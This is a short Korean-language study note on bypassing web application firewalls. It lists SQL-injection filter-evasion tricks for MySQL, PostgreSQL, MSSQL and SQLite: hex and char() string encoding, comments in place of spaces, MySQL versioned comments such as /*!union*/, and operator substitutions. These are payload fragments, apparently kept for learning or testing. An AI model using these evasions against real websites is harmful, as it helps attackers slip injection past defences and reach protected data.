## Bypass WAF
### Bypass WAF
---
WAF란 웹 애플리케이션에 특화된 방화벽이다. 방화벽을 적용하면 디도스와 sqli, log4j등의 공격을 탐지하고, 접속을 차단한다. 
#### 탐지 우회
- 대소문자 검사 미흡
- 탐지 과정 미흡
- 문자열 검사 미흡
`reverse`, `concat`을 이용하여 문자열을 바꾸거나, 16진수를 이용하여 임의의 문자열을 만든다.
- 연산자 검사 미흡
&&, ||, ^, =, !=, %, /, *, &, |, >, <, XOR, DIV, LIKE, RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL 등의 연산자를 이용한다.
- 공백 탐지
#### MySQL
- 문자열 검사 우회
  ```sql
  select 0x6162, 0b110000101100010;
  select char(0x61, 0x62);
  select concat(char(0x61), char(0x62));
  select mid(@@version,12,1);
  ``` 
- 공백 검사 우회
  ```sql
  select
  1;
  select/**/1;
  ```
- 주석 구문 실행
  ```sql
  select 1 /*!union*/ select 2;
  ```
#### PostgreSQL
- 문자열 검사 우회
  ```sql
  select chr(65);
  select concat(chr(65), chr(66));
  select substring(version(),23,1);
  ```
- 공백 검사 우회
  ```sql
  select
  1;
  select /**/1;
  ```
#### MSSQL
- 문자열 검사 우회
  ```sql
  select char(0x61);
  select concat(char(0x61), char(0x62));
  select substring(@@version,134,1);
  ```
- 공백 검사 우회
  ```sql
  select
  1;
  select /**/1;
  ```
#### SQLite
- 문자열 검사 우회
  ```sql
  select char(0x61);
  select char(0x61)||char(0x62);
  ```
- 공백 검사 우회
  ```sql
  select
  1;
  select/**/1;
  ```
- 구문 검사 우회
  ```sql
  select 1 union values(2);
  ```